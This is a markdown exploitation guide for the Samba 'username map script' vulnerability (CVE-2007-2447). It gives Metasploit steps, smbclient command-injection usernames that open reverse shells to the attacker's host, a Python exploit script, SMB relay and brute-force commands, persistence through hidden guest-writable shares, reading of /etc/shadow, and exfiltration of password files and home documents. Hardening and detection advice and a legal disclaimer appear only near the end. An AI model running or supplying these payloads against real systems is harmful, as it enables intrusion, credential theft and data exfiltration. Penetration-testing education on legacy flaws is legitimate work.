# üîê Samba (Ports 139/445) - Exploitation Guide

## üéØ Vulnerability Overview

**Service:** Samba (SMB/CIFS)  
**Ports:** 139/tcp (NetBIOS), 445/tcp (SMB)  
**Vulnerable Version:** Samba 3.0.20 - 3.0.25rc3  
**CVE:** CVE-2007-2447  
**Vulnerability Type:** Remote Code Execution  
**Severity:** Critical (CVSS 10.0)

### Description
Samba versions 3.0.0 through 3.0.25rc3 contain a vulnerability in the username map script functionality. The vulnerability allows remote attackers to execute arbitrary commands via shell metacharacters involving the SamrChangePassword function and the username map script option.

---

## üîç Reconnaissance Workflow

### Step 1: Service Detection

#### Port Scanning
```bash
# Quick SMB port scan
nmap -p 139,445 <target-ip>

# Service version detection
nmap -sV -p 139,445 <target-ip>

# Comprehensive SMB enumeration
nmap -sV -sC -p 139,445 --script smb-* <target-ip>

# NetBIOS enumeration
nmap -sU -sV -p 137 --script nbstat <target-ip>
```

#### SMB Version Detection
```bash
# Using smbclient
smbclient -L //<target-ip>

# Using rpcclient
rpcclient -U "" <target-ip>

# Using nmblookup
nmblookup -A <target-ip>

# Metasploit SMB version scanner
msfconsole -q -x "use auxiliary/scanner/smb/smb_version; set RHOSTS <target-ip>; run; exit"
```

### Step 2: SMB Enumeration

#### Share Enumeration
```bash
# List shares with null session
smbclient -L //<target-ip> -N

# Using smbmap
smbmap -H <target-ip>
smbmap -H <target-ip> -u null -p ""

# Using crackmapexec
crackmapexec smb <target-ip> --shares

# Using enum4linux
enum4linux -a <target-ip>
```

#### Detailed SMB Information
```bash
# SMB protocol enumeration
nmap --script smb-protocols -p 445 <target-ip>

# SMB security mode
nmap --script smb-security-mode -p 445 <target-ip>

# SMB OS discovery
nmap --script smb-os-discovery -p 445 <target-ip>

# Check for SMB signing
nmap --script smb-security-mode -p 445 <target-ip>
```

### Step 3: User and Group Enumeration
```bash
# Enumerate users
enum4linux -U <target-ip>
rpcclient -U "" <target-ip> -N -c "enumdomusers"

# Enumerate groups
enum4linux -G <target-ip>
rpcclient -U "" <target-ip> -N -c "enumdomgroups"

# User SID enumeration
enum4linux -r -u "" -p "" <target-ip>

# Password policy
enum4linux -P <target-ip>
```

---

## üí• Exploitation Workflow

### Method 1: Username Map Script Exploitation (CVE-2007-2447)

#### Metasploit Exploitation
```bash
# Start Metasploit
msfconsole

# Use the Samba usermap_script exploit
use exploit/multi/samba/usermap_script

# Show exploit options
show options

# Set target
set RHOSTS <target-ip>
set LHOST <your-ip>

# Optional: Set specific payload
set PAYLOAD cmd/unix/reverse_netcat
set LPORT 4444

# Check if target is vulnerable
check

# Execute exploit
exploit
```

#### Manual Exploitation via smbclient
```bash
# Connect with malicious username containing command injection
smbclient //<target-ip>/tmp -U './=`nohup nc -e /bin/sh <your-ip> 4444`'

# Alternative payloads
smbclient //<target-ip>/tmp -U '`id > /tmp/pwned.txt`'
smbclient //<target-ip>/tmp -U './=`/bin/bash -i >& /dev/tcp/<your-ip>/4444 0>&1`'

# Set up listener first
nc -lvnp 4444
```

#### Python Exploitation Script
```python
#!/usr/bin/env python3
import socket
import sys
from smb.SMBConnection import SMBConnection

def exploit_samba_usermap(target_ip, command):
    try:
        # Create SMB connection with malicious username
        malicious_username = f'./=`{command}`'
        
        # Connect to SMB
        conn = SMBConnection(malicious_username, '', '', '', use_ntlm_v2=False)
        
        # This will trigger the vulnerability
        conn.connect(target_ip, 139)
        
        print(f"Exploit sent to {target_ip}")
        print(f"Command executed: {command}")
        
    except Exception as e:
        print(f"Exploitation failed: {e}")

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 samba_exploit.py <target-ip> '<command>'")
        print("Example: python3 samba_exploit.py 192.168.1.10 'nc -e /bin/sh 192.168.1.5 4444'")
        sys.exit(1)
    
    target = sys.argv[1]
    command = sys.argv[2]
    
    print(f"Exploiting Samba usermap_script vulnerability on {target}")
    print(f"Command to execute: {command}")
    
    exploit_samba_usermap(target, command)

if __name__ == "__main__":
    main()
```

### Method 2: Share-based Exploitation

#### Writable Share Access
```bash
# Check for writable shares
smbmap -H <target-ip> -R

# Connect to writable share
smbclient //<target-ip>/writable_share -N

# Upload reverse shell
put reverse_shell.php
put backdoor.jsp
put webshell.aspx
```

#### SMB Relay Attack
```bash
# Using Responder and ntlmrelayx
responder -I eth0 -A

# In another terminal
ntlmrelayx.py -tf targets.txt -smb2support

# Or using Metasploit
use auxiliary/server/capture/smb
set SRVHOST <your-ip>
run
```

### Method 3: SMB Brute Force

#### Using Hydra
```bash
# Single user brute force
hydra -l administrator -P /usr/share/wordlists/rockyou.txt <target-ip> smb

# Multiple users
hydra -L users.txt -P passwords.txt <target-ip> smb

# SMB with domain
hydra -l administrator -P passwords.txt <target-ip> smb -V -f
```

#### Using crackmapexec
```bash
# Password spraying
crackmapexec smb <target-ip> -u users.txt -p 'Password123!' --continue-on-success

# Brute force
crackmapexec smb <target-ip> -u admin -p passwords.txt

# Hash-based authentication
crackmapexec smb <target-ip> -u admin -H <ntlm-hash>
```

#### Using Metasploit
```bash
# SMB login scanner
use auxiliary/scanner/smb/smb_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

---

## ‚úÖ Post-Exploitation Activities

### Initial System Assessment
```bash
# Verify shell access and privileges
id
whoami
groups
uname -a
hostname

# Check if running as root
if [ "$EUID" -eq 0 ]; then
    echo "Running as root!"
else
    echo "Running as user: $(whoami)"
fi
```

### SMB-Specific Enumeration
```bash
# Check SMB configuration
cat /etc/samba/smb.conf
testparm -s

# SMB shares and permissions
smbstatus
smbclient -L localhost

# SMB users and groups
pdbedit -L
net user
net group
```

### System Information Gathering
```bash
# Operating system details
cat /etc/*release*
lsb_release -a
cat /proc/version

# Network configuration
ifconfig -a
ip addr show
netstat -tulpn
ss -tulpn

# Mounted filesystems
mount
df -h
cat /proc/mounts
```

### Service Enumeration
```bash
# Running processes
ps aux | grep -E "(smbd|nmbd|samba)"
ps -ef

# Services status
systemctl status smbd
systemctl status nmbd
service --status-all

# Network listeners
netstat -tulpn | grep -E "(139|445)"
lsof -i :139
lsof -i :445
```

### File System Analysis
```bash
# SMB share directories
ls -la /var/samba/
ls -la /home/samba/
find / -name "*smb*" -type d 2>/dev/null

# Configuration files
find /etc -name "*smb*" -o -name "*samba*" 2>/dev/null
cat /etc/samba/smb.conf
cat /etc/samba/smbpasswd

# Log files
tail -50 /var/log/samba/log.smbd
tail -50 /var/log/samba/log.nmbd
grep -i error /var/log/samba/*
```

### User and Permission Analysis
```bash
# SMB users
pdbedit -L -v
cat /etc/samba/smbpasswd

# System users
cat /etc/passwd | grep -E "(samba|smb)"
cat /etc/group | grep -E "(samba|smb)"

# Home directories
ls -la /home/
find /home -type f -name "*.txt" -o -name "*.doc*" 2>/dev/null
```

---

## üîß Advanced Exploitation Techniques

### Persistence Mechanisms

#### SMB User Creation
```bash
# Create new SMB user (if root access)
useradd -m -s /bin/bash smbuser
echo "smbuser:SecurePass123" | chpasswd

# Add to Samba
smbpasswd -a smbuser
smbpasswd -e smbuser

# Add to SMB configuration
echo "[smbuser_share]" >> /etc/samba/smb.conf
echo "path = /home/smbuser" >> /etc/samba/smb.conf
echo "valid users = smbuser" >> /etc/samba/smb.conf
echo "writable = yes" >> /etc/samba/smb.conf

# Restart Samba services
systemctl restart smbd nmbd
```

#### Backdoor Share Creation
```bash
# Create hidden share
mkdir -p /tmp/.hidden
chmod 777 /tmp/.hidden

# Add to smb.conf
cat >> /etc/samba/smb.conf << EOF
[hidden$]
path = /tmp/.hidden
browseable = no
writable = yes
guest ok = yes
public = yes
EOF

# Restart services
systemctl reload smbd
```

### Lateral Movement

#### SMB Share Mounting
```bash
# Mount remote SMB shares
mkdir -p /mnt/remote_share
mount -t cifs //<remote-ip>/share /mnt/remote_share -o username=user,password=pass

# Discover other SMB servers
nmap -p 445 --script smb-os-discovery <network-range>
```

#### Pass-the-Hash Attacks
```bash
# Extract password hashes
cat /etc/shadow
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt

# Use extracted hashes
smbclient -L //<target-ip> -U administrator%<lm:ntlm-hash>
crackmapexec smb <target-ip> -u administrator -H <ntlm-hash>
```

### Data Exfiltration

#### SMB-based Exfiltration
```bash
# Compress sensitive data
tar -czf /tmp/exfil.tar.gz /etc/passwd /etc/shadow /home/*/Documents/

# Create temporary SMB share for exfiltration
mkdir -p /tmp/exfil_share
echo "[exfil]" >> /etc/samba/smb.conf
echo "path = /tmp/exfil_share" >> /etc/samba/smb.conf
echo "writable = yes" >> /etc/samba/smb.conf
echo "guest ok = yes" >> /etc/samba/smb.conf

# Move data to share
mv /tmp/exfil.tar.gz /tmp/exfil_share/

# Access from attacker machine
smbclient //<target-ip>/exfil -N
get exfil.tar.gz
```

---

## üîç Vulnerability Assessment

### SMB Security Audit Script
```bash
#!/bin/bash

TARGET=$1

echo "=== SMB Security Assessment for $TARGET ==="

# Basic connectivity
echo "[+] Testing SMB connectivity..."
nmap -p 139,445 $TARGET

# SMB version
echo "[+] SMB Version Detection..."
smbclient -L //$TARGET 2>&1 | grep -i "protocol"

# Null session
echo "[+] Testing null session..."
smbclient -L //$TARGET -N

# Anonymous access
echo "[+] Testing anonymous access..."
smbmap -H $TARGET -u anonymous

# SMB signing
echo "[+] Checking SMB signing..."
nmap --script smb-security-mode -p 445 $TARGET

# Vulnerable versions
echo "[+] Checking for known vulnerabilities..."
nmap --script smb-vuln-* -p 445 $TARGET

echo "=== Assessment Complete ==="
```

### Common SMB Vulnerabilities Check
```bash
# EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p 445 <target-ip>

# MS08-067
nmap --script smb-vuln-ms08-067 -p 445 <target-ip>

# SMB Ghost (CVE-2020-0796)
nmap --script smb-vuln-cve-2020-0796 -p 445 <target-ip>

# Username enumeration
nmap --script smb-enum-users -p 445 <target-ip>

# Share enumeration
nmap --script smb-enum-shares -p 445 <target-ip>
```

---

## üõ†Ô∏è Detection and Mitigation

### Log Analysis
```bash
# Check SMB authentication logs
grep -i "smb" /var/log/auth.log
grep -i "samba" /var/log/syslog

# Samba specific logs
tail -f /var/log/samba/log.smbd
grep "authentication" /var/log/samba/log.smbd
grep "failed" /var/log/samba/log.smbd

# Failed login attempts
grep "authentication failure" /var/log/samba/log.smbd
grep "bad password" /var/log/samba/log.smbd
```

### Network Monitoring
```bash
# Monitor SMB traffic
tcpdump -i any port 445 -A
tcpdump -i any port 139 -A

# Wireshark filters for SMB analysis
# smb2
# smb.cmd == 0x73  # Session Setup
# smb.cmd == 0x75  # Tree Connect
```

### Incident Response
```bash
# Stop SMB services immediately
systemctl stop smbd nmbd
service smbd stop
service nmbd stop

# Block SMB ports
iptables -A INPUT -p tcp --dport 139 -j DROP
iptables -A INPUT -p tcp --dport 445 -j DROP
iptables -A OUTPUT -p tcp --dport 139 -j DROP
iptables -A OUTPUT -p tcp --dport 445 -j DROP

# Kill existing SMB connections
ss -K dst :445
ss -K dst :139
```

### Security Hardening

#### Samba Configuration Hardening
```bash
# Edit /etc/samba/smb.conf
[global]
# Disable SMBv1
min protocol = SMB2
client min protocol = SMB2
client max protocol = SMB3

# Enable SMB signing
server signing = mandatory
client signing = mandatory

# Restrict anonymous access
restrict anonymous = 2
map to guest = Never

# Logging
log level = 2
log file = /var/log/samba/log.%m
max log size = 1000

# Security settings
obey pam restrictions = yes
unix password sync = yes
passwd program = /usr/bin/passwd %u
pam password change = yes

# Disable unnecessary features
load printers = no
printing = bsd
printcap name = /dev/null
disable spoolss = yes
```

#### Firewall Configuration
```bash
# UFW (Ubuntu)
ufw deny 139
ufw deny 445
ufw allow from <trusted-network> to any port 445

# iptables rules
iptables -A INPUT -p tcp --dport 139 -s <trusted-network> -j ACCEPT
iptables -A INPUT -p tcp --dport 445 -s <trusted-network> -j ACCEPT
iptables -A INPUT -p tcp --dport 139 -j DROP
iptables -A INPUT -p tcp --dport 445 -j DROP

# Save rules
iptables-save > /etc/iptables/rules.v4
```

---

## üìö References and Tools

### Essential Tools
- **smbclient:** SMB client for Linux
- **smbmap:** SMB share enumeration
- **enum4linux:** SMB enumeration script
- **crackmapexec:** Network service cracking
- **rpcclient:** RPC client for Windows systems
- **Metasploit:** Penetration testing framework

### Wordlists and Payloads
```bash
# Common SMB wordlists
/usr/share/wordlists/metasploit/common_users.txt
/usr/share/wordlists/metasploit/common_passwords.txt
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
```

### Online Resources
- **CVE-2007-2447:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447
- **Samba Security:** https://www.samba.org/samba/security/
- **SMB Protocol Documentation:** https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/
- **NIST SMB Guidelines:** https://csrc.nist.gov/

---

## ‚ö†Ô∏è Legal and Ethical Considerations

**WARNING:** This guide is for educational and authorized security testing purposes only.

### Important Guidelines:
- Always obtain proper written authorization before testing
- Only test systems you own or have explicit permission to test
- SMB attacks can be disruptive - test carefully in production
- Document all activities for reporting purposes
- Follow responsible disclosure practices
- Comply with local laws and regulations

### Best Practices:
- Use isolated test environments when possible
- Limit brute force attempts to avoid account lockouts
- Monitor system resources during testing
- Clean up any files or changes made during testing
- Report vulnerabilities through proper channels
- Consider business impact when testing SMB services

---

*Last Updated: August 2025*  
*Version: 1.0*